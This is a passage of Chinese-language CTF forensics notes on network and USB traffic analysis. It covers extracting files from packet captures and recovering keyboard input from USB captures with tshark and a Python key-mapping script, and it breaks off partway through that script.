<a href=#%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90%e5%9f%ba%e7%a1%80%e8%80%83%e7%82%b9 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=1直接搜索flag明文或者编码过的flag><span>1、直接搜索flag明文或者编码过的flag:</span>
<a href=#1%e7%9b%b4%e6%8e%a5%e6%90%9c%e7%b4%a2flag%e6%98%8e%e6%96%87%e6%88%96%e8%80%85%e7%bc%96%e7%a0%81%e8%bf%87%e7%9a%84flag class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h3 class=heading-element id=2流量包端口隐写可能会有01互换><span>2、流量包端口隐写（可能会有01互换）</span>
<a href=#2%e6%b5%81%e9%87%8f%e5%8c%85%e7%ab%af%e5%8f%a3%e9%9a%90%e5%86%99%e5%8f%af%e8%83%bd%e4%bc%9a%e6%9c%8901%e4%ba%92%e6%8d%a2 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h3 class=heading-element id=3tcpftp协议传输文件binwalk和foremost都没用><span>3、TCP/FTP协议传输文件(binwalk和foremost都没用)：</span>
<a href=#3tcpftp%e5%8d%8f%e8%ae%ae%e4%bc%a0%e8%be%93%e6%96%87%e4%bb%b6binwalk%e5%92%8cforemost%e9%83%bd%e6%b2%a1%e7%94%a8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. 直接用wireshark导出为pcap文件然后用networkminer分析
</span></span><span class=line><span class=cl>2. 拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap
</span></span><span class=line><span class=cl>3. 直接追踪流提取16进制，根据文件头尾提取出文件</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=4有时候可能需要根据ip或者版本分类导出><span>4、有时候可能需要根据IP或者版本分类导出</span>
<a href=#4%e6%9c%89%e6%97%b6%e5%80%99%e5%8f%af%e8%83%bd%e9%9c%80%e8%a6%81%e6%a0%b9%e6%8d%aeip%e6%88%96%e8%80%85%e7%89%88%e6%9c%ac%e5%88%86%e7%b1%bb%e5%af%bc%e5%87%ba class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h2 class=heading-element id=usb流量分析><span>USB流量分析</span>
<a href=#usb%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量</p><p>流量包中数据存储的字段有两种：<code>usb.capdata</code> 和 <code>usbhid.data</code></p><h3 class=heading-element id=键盘流量分析><span>键盘流量分析</span>
<a href=#%e9%94%ae%e7%9b%98%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>键盘流量的数据常见的长度为8字节</p></blockquote><p>首先根据数据存储的字段，用<code>tshark</code>提取出数据，注意在有多个IP的情况下要用过滤器分IP提取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tshark -r example.pcapng -Y <span class=s1>&#39;usb.src == &#34;2.3.1&#34;&#39;</span> -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>然后使用脚本根据对照表还原出键盘输入的数据即可</p><blockquote><p>Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的</p><p>因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行</p><p>这里就贴一份的自己写的还原脚本吧</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>normalKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span> <span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span> <span class=s2>&#34;b&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span> <span class=s2>&#34;c&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span> <span class=s2>&#34;d&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span> <span class=s2>&#34;e&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span> <span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=s2>&#34;0a&#34;</span><span class=p>:</span> <span class=s2>&#34;g&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span> <span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span> <span class=s2>&#34;i&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;0d&#34;</span><span class=p>:</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span> <span class=s2>&#34;k&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span> <span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span> <span class=s2>&#34;m&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span> <span class=s2>&#34;n&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span> <span class=s2>&#34;o&#34;</span><span class=p>,</span> <span class=s2>&#34;13&#34;</span><span class=p>:</span> <span class=s2>&#34;p&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span> <span class=s2>&#34;q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;16&#34;</span><span class=p>:</span> <span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span class=p>:</span> <span class=s2>&#34;t&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span> <span class=s2>&#34;u&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span> <span class=s2>&#34;v&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span> <span class=s2>&#34;x&#34;</span><span class=p>,</span> <span class=s2>&#34;1c&#34;</span><span class=p>:</span> <span class=s2>&#34;y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span> <span class=s2>&#34;z&#34;</span><span class=p>,</span> <span class=s2>&#34;1e&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;1f&#34;</span><span class=p>:</span> <span class=s2>&#34;2&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span> <span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span> <span class=s2>&#34;4&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span> <span class=s2>&#34;5&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span> <span class=s2>&#34;6&#34;</span><span class=p>,</span> <span class=s2>&#34;24&#34;</span><span class=p>:</span> <span class=s2>&#34;7&#34;</span><span class=p>,</span> <span class=s2>&#34;25&#34;</span><span class=p>:</span> <span class=s2>&#34;8&#34;</span><span class=p>,</span> <span class=s2>&#34;26&#34;</span><span class=p>:</span> <span class=s2>&#34;9&#34;</span><span class=p>,</span> <span class=s2>&#34;27&#34;</span><span class=p>:</span> <span class=s2>&#34;0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;28&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;29&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;SPACE&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2d&#34;</span><span class=p>:</span> <span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;2e&#34;</span><span class=p>:</span> <span class=s2>&#34;=&#34;</span><span class=p>,</span> <span class=s2>&#34;2f&#34;</span><span class=p>:</span> <span class=s2>&#34;[&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;30&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span><span class=p>,</span> <span class=s2>&#34;31&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;33&#34;</span><span class=p>:</span> <span class=s2>&#34;;&#34;</span><span class=p>,</span> <span class=s2>&#34;34&#34;</span><span class=p>:</span> <span class=s2>&#34;&#39;&#34;</span><span class=p>,</span> <span class=s2>&#34;35&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;GA&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;36&#34;</span><span class=p>:</span> <span class=s2>&#34;,&#34;</span><span class=p>,</span> <span class=s2>&#34;37&#34;</span><span class=p>:</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=s2>&#34;38&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;39&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3b&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3d&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F4&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3e&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F5&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3f&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F6&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;40&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;41&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;42&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;43&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;44&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F11&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;45&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F12&gt;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shiftKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span> <span class=s2>&#34;B&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span> <span class=s2>&#34;C&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span> <span class=s2>&#34;D&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span> <span class=s2>&#34;E&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span> <span class=s2>&#34;F&#34;</span><span class=p>,</span><span class=s2>&#34;0a&#34;</span><span class=p>:</span> <span class=s2>&#34;G&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span> <span class=s2>&#34;H&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span> <span class=s2>&#34;I&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;0d&#34;</span><span class=p>:</span> <span class=s2>&#34;J&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span> <span class=s2>&#34;K&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span> <span class=s2>&#34;L&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span> <span class=s2>&#34;M&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span> <span class=s2>&#34;N&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span> <span class=s2>&#34;O&#34;</span><span class=p>,</span><span class=s2>&#34;13&#34;</span><span class=p>:</span> <span class=s2>&#34;P&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span> <span class=s2>&#34;Q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span> <span class=s2>&#34;R&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;16&#34;</span><span class=p>:</span> <span class=s2>&#34;S&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span class=p>:</span> <span class=s2>&#34;T&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span> <span class=s2>&#34;U&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span> <span class=s2>&#34;V&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span> <span class=s2>&#34;W&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span> <span class=s2>&#34;X&#34;</span><span class=p>,</span><span class=s2>&#34;1c&#34;</span><span class=p>:</span> <span class=s2>&#34;Y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span> <span class=s2>&#34;Z&#34;</span><span class=p>,</span> <span class=s2>&#34;1e&#34;</span><span class=p>:</span> <span class=s2>&#34;!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;1f&#34;</span><span class=p>:</span> <span class=s2>&#34;@&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span> <span class=s2>&#34;#&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span> <span class=s2>&#34;$&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span> <span class=s2>&#34;%&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span> <span class=s2>&#34;^&#34;</span><span class=p>,</span> <span class=s2>&#34;24&#34;</span><span class=p>:</span> <span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;25&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span> <span class=s2>&#34;26&#34;</span><span class=p>:</span> <span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;27&#34;</span><span class=p>:</span> <span class=s2>&#34;)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;28&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;29&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; SPACE &gt; &#34;</span><span class=p>,</span> <span class=s2>&#34;2d&#34;</span><span class=p>:</span> <span class=s2>&#34;_&#34;</span><span class=p>,</span> <span class=s2>&#34;2e&#34;</span><span class=p>:</span> <span class=s2>&#34; + &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;2f&#34;</span><span class=p>:</span> <span class=s2>&#34;{&#34;</span><span class=p>,</span> <span class=s2>&#34;30&#34;</span><span class=p>:</span> <span class=s2>&#34;}&#34;</span><span class=p>,</span> <span class=s2>&#34;31&#34;</span><span class=p>:</span> <span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;33&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;34&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;35&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;TILDE&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;36&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;37&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;38&#34;</span><span class=p>:</span> <span class=s2>&#34;?&#34;</span><span class=p>,</span><span class=s2>&#34;39&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3b&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3d&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; F4 &gt; &#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;3e&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F5 &gt; &#34;</span><span class=p>,</span><span class=s2>&#34;3f&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F6 &gt; &#34;</span><span class=p>,</span><span class=s2>&#34;40&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;41&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;42&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;43&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;44&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; F11 &gt; &#34;</span><span class=p>,</span> <span class=s2>&#34;45&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F12 &gt; &#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>delete_output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
